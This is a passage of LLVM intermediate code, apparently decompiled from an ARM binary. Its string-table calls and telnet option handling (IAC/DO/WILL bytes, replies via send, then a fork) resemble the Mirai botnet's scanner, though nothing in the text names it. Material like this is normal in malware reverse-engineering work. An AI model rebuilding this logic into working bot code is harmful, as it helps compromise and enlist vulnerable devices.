  store i32 %v2_1135c, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_11430 = call i32 @table_retrieve_val(i32 29, i32* %v2_11364)
  %v3_11434 = load i8, i8* %stack_var_-56, align 1
  %v4_11434 = sext i8 %v3_11434 to i32
  store i32 %v3_11430, i32* %r2.global-to-local, align 4
  %v1_1143c = add nsw i32 %v4_11434, -1
  store i32 %v1_1143c, i32* %r3.global-to-local, align 4
  %v0_11440 = load i32, i32* @sl, align 4
  store i32 %v0_11440, i32* %r0.global-to-local, align 4
  %v0_11444 = load i32, i32* @r5, align 4
  %v1_11444 = add i32 %v0_11444, 24
  %v2_11444 = inttoptr i32 %v1_11444 to i32*
  %v3_11444 = load i32, i32* %v2_11444, align 4
  store i32 %v3_11444, i32* %r1.global-to-local, align 4
  %v4_11448 = call i32 @util_memsearch(i32 %v0_11440, i32 %v3_11444, i32 %v3_11430, i32 %v1_1143c)
  store i32 %v4_11448, i32* %r0.global-to-local, align 4
  %v1_1144c = add i32 %v4_11448, 1
  store i32 %v1_1144c, i32* @r7, align 4
  %v2_1144c = icmp eq i32 %v4_11448, -1
  store i1 %v2_1144c, i1* %cpsr_c.global-to-local, align 1
  %v7_1144c = icmp eq i32 %v1_1144c, 0
  store i1 %v7_1144c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1144c, label %thread-pre-split103, label %bb415

bb415:                                            ; preds = %dec_label_pc_1141c
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split103

thread-pre-split103:                              ; preds = %dec_label_pc_1141c, %bb415
  %v0_11454 = phi i1 [ false, %bb415 ], [ true, %dec_label_pc_1141c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_11454, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_11858 = call i32 @table_lock_val(i32 29)
  store i32 %v1_11858, i32* %r0.global-to-local, align 4
  %v0_1185c = load i32, i32* @r5, align 4
  br i1 %v0_11454, label %dec_label_pc_11854, label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %thread-pre-split103, %dec_label_pc_115e4
  %v0_11464 = phi i32 [ %v0_10d4c, %dec_label_pc_115e4 ], [ %v0_1185c, %thread-pre-split103 ]
  %v1_11464 = inttoptr i32 %v0_11464 to i32*
  %v2_11464 = load i32, i32* %v1_11464, align 4
  store i32 %v2_11464, i32* %r3.global-to-local, align 4
  %v1_11468 = add i32 %v0_11464, 4
  %v2_11468 = inttoptr i32 %v1_11468 to i32*
  %v3_11468 = load i32, i32* %v2_11468, align 4
  store i32 %v3_11468, i32* %r0.global-to-local, align 4
  %v1_1146c = add i32 %v2_11464, 13
  %v2_1146c = inttoptr i32 %v1_1146c to i8*
  %v3_1146c = load i8, i8* %v2_1146c, align 1
  %v4_1146c = zext i8 %v3_1146c to i32
  store i32 %v4_1146c, i32* %r2.global-to-local, align 4
  %v1_11470 = add i32 %v2_11464, 4
  %v2_11470 = inttoptr i32 %v1_11470 to i32*
  %v3_11470 = load i32, i32* %v2_11470, align 4
  store i32 %v3_11470, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11478 = call i32 @__libc_send(i32 %v3_11468, i32 %v3_11470, i32 %v4_1146c, i32 16384)
  store i32 %v4_11478, i32* %r0.global-to-local, align 4
  %v0_1147c = load i32, i32* @r5, align 4
  %v1_1147c = add i32 %v0_1147c, 4
  %v2_1147c = inttoptr i32 %v1_1147c to i32*
  %v3_1147c = load i32, i32* %v2_1147c, align 4
  store i32 %v3_1147c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1148c = call i32 @__libc_send(i32 %v3_1147c, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_11494 = load i32, i32* @r5, align 4
  %v2_11494 = add i32 %v1_11494, 12
  %v3_11494 = inttoptr i32 %v2_11494 to i32*
  store i32 5, i32* %v3_11494, align 4
  br label %dec_label_pc_11498

dec_label_pc_11498:                               ; preds = %dec_label_pc_11564, %bb419, %dec_label_pc_11394, %dec_label_pc_11674, %dec_label_pc_115f0, %dec_label_pc_116b8, %dec_label_pc_11464
  %v0_11498 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11498 = icmp eq i32 %v0_11498, 0
  store i1 %v2_11498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11498, label %dec_label_pc_10ccc.loopexit, label %dec_label_pc_10e6c

dec_label_pc_114a4:                               ; preds = %dec_label_pc_10d4c
  %v1_114a4 = add i32 %v0_10d4c, 24
  %v2_114a4 = inttoptr i32 %v1_114a4 to i32*
  %v3_114a4 = load i32, i32* %v2_114a4, align 4
  store i32 %v3_114a4, i32* %r2.global-to-local, align 4
  %v0_114a8 = load i32, i32* @sl, align 4
  store i32 %v0_114a8, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_114b0146 = icmp eq i32 %v3_114a4, 0
  store i1 %v3_114b0146, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_114b0146, i1* %cpsr_z.global-to-local, align 1
  %v6_114b4153 = icmp sgt i32 %v3_114a4, 0
  br i1 %v6_114b4153, label %dec_label_pc_114b8.preheader, label %dec_label_pc_11564

dec_label_pc_114b0.loopexit:                      ; preds = %dec_label_pc_114d4
  %v2_114dc = add i32 %v1_114dc, 2
  store i32 %v2_114dc, i32* @r4, align 4
  %v2_114e0 = add i32 %v1_114e0, 2
  store i32 %v2_114e0, i32* @r7, align 4
  %v3_114b0 = icmp uge i32 %v2_114e0, %v1_114b0
  store i1 %v3_114b0, i1* %cpsr_c.global-to-local, align 1
  %v9_114b0 = icmp eq i32 %v2_114e0, %v1_114b0
  store i1 %v9_114b0, i1* %cpsr_z.global-to-local, align 1
  %v6_114b4 = icmp slt i32 %v2_114e0, %v1_114b0
  br i1 %v6_114b4, label %dec_label_pc_114b8.preheader, label %dec_label_pc_11564

dec_label_pc_114b8.preheader:                     ; preds = %dec_label_pc_114a4, %dec_label_pc_114b0.loopexit
  %v6_1156c239 = phi i32 [ %v6_1156c240, %dec_label_pc_114b0.loopexit ], [ %v0_10d4c, %dec_label_pc_114a4 ]
  %v1_114e0222 = phi i32 [ %v2_114e0, %dec_label_pc_114b0.loopexit ], [ 0, %dec_label_pc_114a4 ]
  %v1_114c4220 = phi i32 [ %v1_114b0, %dec_label_pc_114b0.loopexit ], [ %v3_114a4, %dec_label_pc_114a4 ]
  %v0_114b8218 = phi i32 [ %v2_114dc, %dec_label_pc_114b0.loopexit ], [ %v0_114a8, %dec_label_pc_114a4 ]
  br label %dec_label_pc_114b8

dec_label_pc_114b8:                               ; preds = %dec_label_pc_114b8.preheader, %dec_label_pc_11548
  %v6_1156c240 = phi i32 [ %v6_1156c239, %dec_label_pc_114b8.preheader ], [ %v0_11550, %dec_label_pc_11548 ]
  %v1_114e0 = phi i32 [ %v1_114e0222, %dec_label_pc_114b8.preheader ], [ %v1_11554, %dec_label_pc_11548 ]
  %v1_114b0 = phi i32 [ %v1_114c4220, %dec_label_pc_114b8.preheader ], [ %v3_11550, %dec_label_pc_11548 ]
  %v1_114dc = phi i32 [ %v0_114b8218, %dec_label_pc_114b8.preheader ], [ %v1_1155c, %dec_label_pc_11548 ]
  %v1_114b8 = inttoptr i32 %v1_114dc to i8*
  %v2_114b8 = load i8, i8* %v1_114b8, align 1
  %v3_114b8 = zext i8 %v2_114b8 to i32
  store i32 %v3_114b8, i32* @r3, align 4
  %v2_114bc = icmp eq i8 %v2_114b8, -1
  store i1 %v2_114bc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_114bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114bc, label %dec_label_pc_114c4, label %dec_label_pc_11564

dec_label_pc_114c4:                               ; preds = %dec_label_pc_114b8
  %v0_114c4 = load i32, i32* @sl, align 4
  %v2_114c4 = add i32 %v0_114c4, %v1_114b0
  store i32 %v2_114c4, i32* %r1.global-to-local, align 4
  %v1_114c8 = add i32 %v1_114dc, 1
  store i32 %v1_114c8, i32* @r6, align 4
  %v3_114cc = icmp uge i32 %v2_114c4, %v1_114c8
  store i1 %v3_114cc, i1* %cpsr_c.global-to-local, align 1
  %v9_114cc = icmp eq i32 %v2_114c4, %v1_114c8
  store i1 %v9_114cc, i1* %cpsr_z.global-to-local, align 1
  %v2_114d0 = xor i1 %v3_114cc, true
  %v3_114d0 = or i1 %v9_114cc, %v2_114d0
  br i1 %v3_114d0, label %dec_label_pc_11564, label %dec_label_pc_114d4

dec_label_pc_114d4:                               ; preds = %dec_label_pc_114c4
  %v2_114d4 = inttoptr i32 %v1_114c8 to i8*
  %v3_114d4 = load i8, i8* %v2_114d4, align 1
  %v4_114d4 = zext i8 %v3_114d4 to i32
  store i32 %v4_114d4, i32* @r3, align 4
  %v2_114d8 = icmp eq i8 %v3_114d4, -1
  store i1 %v2_114d8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_114d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114d8, label %dec_label_pc_114b0.loopexit, label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %dec_label_pc_114d4
  %v2_114e8 = icmp ugt i8 %v3_114d4, -4
  store i1 %v2_114e8, i1* %cpsr_c.global-to-local, align 1
  %v7_114e8 = icmp eq i8 %v3_114d4, -3
  store i1 %v7_114e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114e8, label %dec_label_pc_11574, label %dec_label_pc_114f0

dec_label_pc_114f0:                               ; preds = %dec_label_pc_114e8
  %v1_114f0 = add i32 %v1_114dc, 2
  store i32 %v1_114f0, i32* @r3, align 4
  %v3_114f4 = icmp uge i32 %v2_114c4, %v1_114f0
  store i1 %v3_114f4, i1* %cpsr_c.global-to-local, align 1
  %v9_114f4 = icmp eq i32 %v2_114c4, %v1_114f0
  store i1 %v9_114f4, i1* %cpsr_z.global-to-local, align 1
  %v2_114f8 = xor i1 %v3_114f4, true
  %v3_114f8 = or i1 %v9_114f4, %v2_114f8
  br i1 %v3_114f8, label %dec_label_pc_11564, label %dec_label_pc_114fc

dec_label_pc_114fc:                               ; preds = %dec_label_pc_115d4, %bb420, %.thread115, %dec_label_pc_114f0
  %v0_114fc = load i32, i32* @r6, align 4
  %v1_114fc = inttoptr i32 %v0_114fc to i8*
  %v2_114fc = load i8, i8* %v1_114fc, align 1
  %v3_114fc = zext i8 %v2_114fc to i32
  store i32 %v3_114fc, i32* %r3.global-to-local, align 4
  %v2_11500 = icmp ugt i8 %v2_114fc, -4
  store i1 %v2_11500, i1* %cpsr_c.global-to-local, align 1
  %v7_11500 = icmp eq i8 %v2_114fc, -3
  store i1 %v7_11500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11500, label %.thread107, label %dec_label_pc_11510

.thread107:                                       ; preds = %dec_label_pc_114fc
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_114fc, align 1
  %v0_1150c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1150c.pr.pr, label %.thread110, label %.thread107.dec_label_pc_11510thread-pre-split_crit_edge

.thread107.dec_label_pc_11510thread-pre-split_crit_edge: ; preds = %.thread107
  %v0_11510.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11510

dec_label_pc_11510:                               ; preds = %dec_label_pc_114fc, %.thread107.dec_label_pc_11510thread-pre-split_crit_edge
  %v0_11510.pr = phi i32 [ %v0_11510.pr.pre, %.thread107.dec_label_pc_11510thread-pre-split_crit_edge ], [ %v3_114fc, %dec_label_pc_114fc ]
  %v2_11510 = icmp ugt i32 %v0_11510.pr, 250
  store i1 %v2_11510, i1* %cpsr_c.global-to-local, align 1
  %v7_11510 = icmp eq i32 %v0_11510.pr, 251
  store i1 %v7_11510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11510, label %bb416, label %.thread110

bb416:                                            ; preds = %dec_label_pc_11510
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11518 = load i32, i32* @r6, align 4
  %v4_11518 = inttoptr i32 %v3_11518 to i8*
  store i8 -3, i8* %v4_11518, align 1
  br label %.thread110

.thread110:                                       ; preds = %dec_label_pc_11510, %.thread107, %bb416
  %v0_1151c = load i32, i32* @r4, align 4
  %v1_1151c = add i32 %v0_1151c, 2
  %v2_1151c = inttoptr i32 %v1_1151c to i8*
  %v3_1151c = load i8, i8* %v2_1151c, align 1
  %v4_1151c = zext i8 %v3_1151c to i32
  store i32 %v4_1151c, i32* %r3.global-to-local, align 4
  %v2_11520 = icmp ugt i8 %v3_1151c, -4
  store i1 %v2_11520, i1* %cpsr_c.global-to-local, align 1
  %v7_11520 = icmp eq i8 %v3_1151c, -3
  store i1 %v7_11520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11520, label %.thread111, label %dec_label_pc_11530

.thread111:                                       ; preds = %.thread110
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_1151c, align 1
  %v0_1152c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1152c.pr.pr, label %.thread114, label %.thread111.dec_label_pc_11530thread-pre-split_crit_edge

.thread111.dec_label_pc_11530thread-pre-split_crit_edge: ; preds = %.thread111
  %v0_11530.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11530

dec_label_pc_11530:                               ; preds = %.thread110, %.thread111.dec_label_pc_11530thread-pre-split_crit_edge
  %v0_11530.pr = phi i32 [ %v0_11530.pr.pre, %.thread111.dec_label_pc_11530thread-pre-split_crit_edge ], [ %v4_1151c, %.thread110 ]
  %v2_11530 = icmp ugt i32 %v0_11530.pr, 250
  store i1 %v2_11530, i1* %cpsr_c.global-to-local, align 1
  %v7_11530 = icmp eq i32 %v0_11530.pr, 251
  store i1 %v7_11530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11530, label %bb417, label %.thread114

bb417:                                            ; preds = %dec_label_pc_11530
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11538 = load i32, i32* @r4, align 4
  %v4_11538 = add i32 %v3_11538, 2
  %v5_11538 = inttoptr i32 %v4_11538 to i8*
  store i8 -3, i8* %v5_11538, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_11530, %.thread111, %bb417
  %v0_1153c = load i32, i32* @r5, align 4
  %v1_1153c = add i32 %v0_1153c, 4
  %v2_1153c = inttoptr i32 %v1_1153c to i32*
  %v3_1153c = load i32, i32* %v2_1153c, align 4
  store i32 %v3_1153c, i32* %r0.global-to-local, align 4
  %v0_11540 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11548

dec_label_pc_11548:                               ; preds = %dec_label_pc_116d0, %.thread114
  %v0_1154c = phi i32 [ %v3_116e8, %dec_label_pc_116d0 ], [ %v3_1153c, %.thread114 ]
  %storemerge4 = phi i32 [ %v2_11594, %dec_label_pc_116d0 ], [ %v0_11540, %.thread114 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_116d0 ], [ 3, %.thread114 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1154c = call i32 @__libc_send(i32 %v0_1154c, i32 %storemerge4, i32 %storemerge, i32 16384)
  store i32 %v4_1154c, i32* %r0.global-to-local, align 4
  %v0_11550 = load i32, i32* @r5, align 4
  %v1_11550 = add i32 %v0_11550, 24
  %v2_11550 = inttoptr i32 %v1_11550 to i32*
  %v3_11550 = load i32, i32* %v2_11550, align 4
  store i32 %v3_11550, i32* %r2.global-to-local, align 4
  %v0_11554 = load i32, i32* @r7, align 4
  %v1_11554 = add i32 %v0_11554, 3
  store i32 %v1_11554, i32* @r7, align 4
  %v3_11558 = icmp uge i32 %v1_11554, %v3_11550
  store i1 %v3_11558, i1* %cpsr_c.global-to-local, align 1
  %v9_11558 = icmp eq i32 %v1_11554, %v3_11550
  store i1 %v9_11558, i1* %cpsr_z.global-to-local, align 1
  %v0_1155c = load i32, i32* @r4, align 4
  %v1_1155c = add i32 %v0_1155c, 3
  store i32 %v1_1155c, i32* @r4, align 4
  %v5_11560 = icmp slt i32 %v1_11554, %v3_11550
  br i1 %v5_11560, label %dec_label_pc_114b8, label %dec_label_pc_11564

dec_label_pc_11564:                               ; preds = %dec_label_pc_114b0.loopexit, %dec_label_pc_114b8, %dec_label_pc_11548, %dec_label_pc_114f0, %dec_label_pc_114c4, %dec_label_pc_114a4, %dec_label_pc_11574.dec_label_pc_11564.loopexit_crit_edge
  %v6_1156c = phi i32 [ %v0_115a0, %dec_label_pc_11574.dec_label_pc_11564.loopexit_crit_edge ], [ %v0_10d4c, %dec_label_pc_114a4 ], [ %v6_1156c240, %dec_label_pc_114b8 ], [ %v0_11550, %dec_label_pc_11548 ], [ %v6_1156c240, %dec_label_pc_114f0 ], [ %v6_1156c240, %dec_label_pc_114c4 ], [ %v6_1156c240, %dec_label_pc_114b0.loopexit ]
  %v0_11564 = phi i32 [ %v0_11564.pre.pre, %dec_label_pc_11574.dec_label_pc_11564.loopexit_crit_edge ], [ 0, %dec_label_pc_114a4 ], [ %v1_114e0, %dec_label_pc_114b8 ], [ %v1_11554, %dec_label_pc_11548 ], [ %v1_114e0, %dec_label_pc_114f0 ], [ %v1_114e0, %dec_label_pc_114c4 ], [ %v2_114e0, %dec_label_pc_114b0.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11564 = icmp eq i32 %v0_11564, 0
  store i1 %v2_11564, i1* %cpsr_z.global-to-local, align 1
  %tmp418 = icmp slt i32 %v0_11564, 1
  br i1 %tmp418, label %dec_label_pc_11498, label %bb419

bb419:                                            ; preds = %dec_label_pc_11564
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_1156c = add i32 %v6_1156c, 12
  %v8_1156c = inttoptr i32 %v7_1156c to i32*
  store i32 3, i32* %v8_1156c, align 4
  br label %dec_label_pc_11498

dec_label_pc_11574:                               ; preds = %dec_label_pc_114e8
  store i32 %v2_11578, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1b987.543 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_11578, i32* @r0, align 4
  %v0_11588 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_11594, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b97e.545 to i32), i32* @r1, align 4
  %v0_1159c = call i32 @memcpy()
  store i32 %v0_1159c, i32* %r0.global-to-local, align 4
  %v0_115a0 = load i32, i32* @r5, align 4
  %v1_115a0 = add i32 %v0_115a0, 24
  %v2_115a0 = inttoptr i32 %v1_115a0 to i32*
  %v3_115a0 = load i32, i32* %v2_115a0, align 4
  %v0_115a4 = load i32, i32* @r4, align 4
  %v1_115a4 = add i32 %v0_115a4, 2
  store i32 %v1_115a4, i32* %r2.global-to-local, align 4
  %v0_115a8 = load i32, i32* @sl, align 4
  %v2_115a8 = add i32 %v0_115a8, %v3_115a0
  store i32 %v2_115a8, i32* @r3, align 4
  %v3_115ac = icmp uge i32 %v2_115a8, %v1_115a4
  store i1 %v3_115ac, i1* %cpsr_c.global-to-local, align 1
  %v9_115ac = icmp eq i32 %v2_115a8, %v1_115a4
  store i1 %v9_115ac, i1* %cpsr_z.global-to-local, align 1
  %v2_115b0 = xor i1 %v3_115ac, true
  %v3_115b0 = or i1 %v9_115ac, %v2_115b0
  br i1 %v3_115b0, label %dec_label_pc_11574.dec_label_pc_11564.loopexit_crit_edge, label %dec_label_pc_115b4

dec_label_pc_11574.dec_label_pc_11564.loopexit_crit_edge: ; preds = %dec_label_pc_11574
  %v0_11564.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11564

dec_label_pc_115b4:                               ; preds = %dec_label_pc_11574
  %v2_115b4 = inttoptr i32 %v1_115a4 to i8*
  %v3_115b4 = load i8, i8* %v2_115b4, align 1
  %v4_115b4 = zext i8 %v3_115b4 to i32
  store i32 %v4_115b4, i32* %r3.global-to-local, align 4
  %v2_115b8 = icmp ugt i8 %v3_115b4, 30
  store i1 %v2_115b8, i1* %cpsr_c.global-to-local, align 1
  %v7_115b8 = icmp eq i8 %v3_115b4, 31
  store i1 %v7_115b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115b8, label %dec_label_pc_116d0, label %dec_label_pc_115c0

dec_label_pc_115c0:                               ; preds = %dec_label_pc_115b4
  %v1_115c0 = inttoptr i32 %v0_115a4 to i8*
  %v2_115c0 = load i8, i8* %v1_115c0, align 1
  %v3_115c0 = zext i8 %v2_115c0 to i32
  store i32 %v3_115c0, i32* %r3.global-to-local, align 4
  %v2_115c4 = icmp ugt i8 %v2_115c0, -4
  store i1 %v2_115c4, i1* %cpsr_c.global-to-local, align 1
  %v7_115c4 = icmp eq i8 %v2_115c0, -3
  store i1 %v7_115c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115c4, label %.thread115, label %dec_label_pc_115d4

.thread115:                                       ; preds = %dec_label_pc_115c0
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_115c0, align 1
  %v0_115d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_115d0.pr.pr, label %dec_label_pc_114fc, label %.thread115.dec_label_pc_115d4thread-pre-split_crit_edge

.thread115.dec_label_pc_115d4thread-pre-split_crit_edge: ; preds = %.thread115
  %v0_115d4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %dec_label_pc_115c0, %.thread115.dec_label_pc_115d4thread-pre-split_crit_edge
  %v0_115d4.pr = phi i32 [ %v0_115d4.pr.pre, %.thread115.dec_label_pc_115d4thread-pre-split_crit_edge ], [ %v3_115c0, %dec_label_pc_115c0 ]
  %v2_115d4 = icmp ugt i32 %v0_115d4.pr, 250
  store i1 %v2_115d4, i1* %cpsr_c.global-to-local, align 1
  %v7_115d4 = icmp eq i32 %v0_115d4.pr, 251
  store i1 %v7_115d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115d4, label %bb420, label %dec_label_pc_114fc

bb420:                                            ; preds = %dec_label_pc_115d4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_115dc = load i32, i32* @r4, align 4
  %v4_115dc = inttoptr i32 %v3_115dc to i8*
  store i8 -3, i8* %v4_115dc, align 1
  br label %dec_label_pc_114fc

dec_label_pc_115e4:                               ; preds = %dec_label_pc_113f0, %dec_label_pc_11408, %dec_label_pc_11400, %bb414, %dec_label_pc_113dc, %dec_label_pc_113c0, %dec_label_pc_113d4, %bb413
  %v0_115e4 = phi i32 [ %v1_113b4, %dec_label_pc_113dc ], [ %v1_113b4, %dec_label_pc_113c0 ], [ %v1_113b4, %dec_label_pc_113d4 ], [ %v1_113b4, %bb413 ], [ %v1_11414, %bb414 ], [ %v1_11414, %dec_label_pc_11400 ], [ %v1_11414, %dec_label_pc_11408 ], [ %v1_11414, %dec_label_pc_113f0 ]
  %v1_115e4 = add i32 %v0_115e4, 1
  store i32 %v1_115e4, i32* @r7, align 4
  br label %dec_label_pc_11464

dec_label_pc_115ec:                               ; preds = %dec_label_pc_11300, %dec_label_pc_11320, %dec_label_pc_11318, %dec_label_pc_11310, %bb410, %dec_label_pc_112ec, %dec_label_pc_112c8, %dec_label_pc_112e4, %dec_label_pc_112dc, %bb409
  %v0_115ec = phi i32 [ %v1_112bc, %dec_label_pc_112ec ], [ %v1_112bc, %dec_label_pc_112c8 ], [ %v1_112bc, %dec_label_pc_112e4 ], [ %v1_112bc, %dec_label_pc_112dc ], [ %v1_112bc, %bb409 ], [ %v1_1132c, %bb410 ], [ %v1_1132c, %dec_label_pc_11310 ], [ %v1_1132c, %dec_label_pc_11318 ], [ %v1_1132c, %dec_label_pc_11320 ], [ %v1_1132c, %dec_label_pc_11300 ]
  %v1_115ec = add i32 %v0_115ec, 1
  store i32 %v1_115ec, i32* @r7, align 4
  br label %dec_label_pc_115f0

dec_label_pc_115f0:                               ; preds = %dec_label_pc_11394.dec_label_pc_115f0_crit_edge, %dec_label_pc_115ec
  %v0_115f0 = phi i32 [ %v0_115f0.pre, %dec_label_pc_11394.dec_label_pc_115f0_crit_edge ], [ %v0_10d4c, %dec_label_pc_115ec ]
  %v1_115f0 = inttoptr i32 %v0_115f0 to i32*
  %v2_115f0 = load i32, i32* %v1_115f0, align 4
  store i32 %v2_115f0, i32* %r3.global-to-local, align 4
  %v1_115f4 = add i32 %v0_115f0, 4
  %v2_115f4 = inttoptr i32 %v1_115f4 to i32*
  %v3_115f4 = load i32, i32* %v2_115f4, align 4
  store i32 %v3_115f4, i32* %r0.global-to-local, align 4
  %v1_115f8 = add i32 %v2_115f0, 12
  %v2_115f8 = inttoptr i32 %v1_115f8 to i8*
  %v3_115f8 = load i8, i8* %v2_115f8, align 1
  %v4_115f8 = zext i8 %v3_115f8 to i32
  store i32 %v4_115f8, i32* %r2.global-to-local, align 4
  %v1_115fc = inttoptr i32 %v2_115f0 to i32*
  %v2_115fc = load i32, i32* %v1_115fc, align 4
  store i32 %v2_115fc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11604 = call i32 @__libc_send(i32 %v3_115f4, i32 %v2_115fc, i32 %v4_115f8, i32 16384)
  store i32 %v4_11604, i32* %r0.global-to-local, align 4
  %v0_11608 = load i32, i32* @r5, align 4
  %v1_11608 = add i32 %v0_11608, 4
  %v2_11608 = inttoptr i32 %v1_11608 to i32*
  %v3_11608 = load i32, i32* %v2_11608, align 4
  store i32 %v3_11608, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11618 = call i32 @__libc_send(i32 %v3_11608, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_11620 = load i32, i32* @r5, align 4
  %v2_11620 = add i32 %v1_11620, 12
  %v3_11620 = inttoptr i32 %v2_11620 to i32*
  store i32 4, i32* %v3_11620, align 4
  br label %dec_label_pc_11498

dec_label_pc_11628:                               ; preds = %dec_label_pc_10df0
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_11634 = call i32 @table_unlock_val(i32 27)
  store i32 %v2_1135c, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_11644 = call i32 @table_retrieve_val(i32 27, i32* nonnull %v2_11364)
  store i32 %v3_11644, i32* %r0.global-to-local, align 4
  %v3_11648 = load i8, i8* %stack_var_-56, align 1
  %v4_11648 = sext i8 %v3_11648 to i32
  store i32 %v3_11644, i32* %r2.global-to-local, align 4
  %v1_11650 = add nsw i32 %v4_11648, -1
  store i32 %v1_11650, i32* %r3.global-to-local, align 4
  %v0_11654 = load i32, i32* @r5, align 4
  %v1_11654 = add i32 %v0_11654, 24
  %v2_11654 = inttoptr i32 %v1_11654 to i32*
  %v3_11654 = load i32, i32* %v2_11654, align 4
  store i32 %v3_11654, i32* %r1.global-to-local, align 4
  %v0_11658 = load i32, i32* @sl, align 4
  store i32 %v0_11658, i32* %r0.global-to-local, align 4
  %v4_1165c = call i32 @util_memsearch(i32 %v0_11658, i32 %v3_11654, i32 %v3_11644, i32 %v1_11650)
  store i32 %v4_1165c, i32* @r7, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_11668 = call i32 @table_lock_val(i32 27)
  store i32 %v1_11668, i32* %r0.global-to-local, align 4
  %v0_1166c = load i32, i32* @r7, align 4
  %v2_1166c = icmp eq i32 %v0_1166c, -1
  store i1 %v2_1166c, i1* %cpsr_c.global-to-local, align 1
  %v7_1166c = icmp eq i32 %v0_1166c, -1
  store i1 %v7_1166c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1166c, label %dec_label_pc_10ccc.loopexit, label %dec_label_pc_11674

dec_label_pc_11674:                               ; preds = %dec_label_pc_11628
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11674 = icmp eq i32 %v0_1166c, 0
  store i1 %v2_11674, i1* %cpsr_z.global-to-local, align 1
  %tmp421 = icmp slt i32 %v0_1166c, 1
  br i1 %tmp421, label %dec_label_pc_11498, label %dec_label_pc_1167c

dec_label_pc_1167c:                               ; preds = %dec_label_pc_11674
  %v0_1167c = load i32, i32* @r5, align 4
  %v1_1167c = add i32 %v0_1167c, 20
  %v2_1167c = inttoptr i32 %v1_1167c to i16*
  %v3_1167c = load i16, i16* %v2_1167c, align 2
  %v4_1167c = zext i16 %v3_1167c to i32
  store i32 %v4_1167c, i32* %r3.global-to-local, align 4
  %v1_11680 = add i32 %v0_1167c, 16
  %v2_11680 = inttoptr i32 %v1_11680 to i32*
  %v3_11680 = load i32, i32* %v2_11680, align 4
  store i32 %v3_11680, i32* %r2.global-to-local, align 4
  store i32 %v2_11684, i32* @lr, align 4
  store i32 %v4_1167c, i32* %stack_var_-42, align 4
  store i32 %v3_11680, i32* %stack_var_-60, align 4
  %v1_11690 = inttoptr i32 %v0_1167c to i32*
  %v2_11690 = load i32, i32* %v1_11690, align 4
  store i32 %v2_11690, i32* @r8, align 4
  %v0_11694 = call i32 @__libc_fork()
